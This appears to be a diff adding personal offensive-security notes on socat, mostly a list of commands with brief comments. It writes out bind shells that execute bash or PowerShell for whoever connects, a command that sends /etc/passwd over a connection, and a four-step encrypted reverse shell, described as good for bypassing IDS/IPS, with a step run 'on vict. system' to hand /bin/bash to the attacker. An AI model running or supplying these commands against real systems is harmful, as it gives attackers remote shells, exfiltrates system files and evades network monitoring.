@@ -1,0 +1,19 @@
+Socat (https://linux.die.net/man/1/socat)
+
+socat -d -d <protocol>:<port> 
+socat -d -d TCP-LISTEN:8081 STDOUT -> -d -d to increase verbosity of the connection, use STOUT to send cmds through the connection 
+socat -d -d TCP-LISTEN:<port> STOUT EXEC:"bash -li"
+socat -d -d TCP-LISTEN:<port> EXEC:"powershell.exe, pipes"
+
+socat -d -d TCP-CONNECT:<IP>:<PORT> -> Connect to a listener 
+socat -d -d TCP-CONNECT:<IP>:<PORT> FILE:/etc/passwd -> Connect to a listener & transfer a file over the connection 
+
+Encrypting Socat:
+Good for bypassing ids/ips
+1) Create cert on attacking system: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 100 -out shell.crt
+2) Merge key and crt into .pem: cat shell.key shell.crt > shell.pem
+3) Setup listener: socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
+4) On vict. system: socat OPENSSL:<local ip>:<port>, verify=0 EXEC:/bin/bash
+
+
+
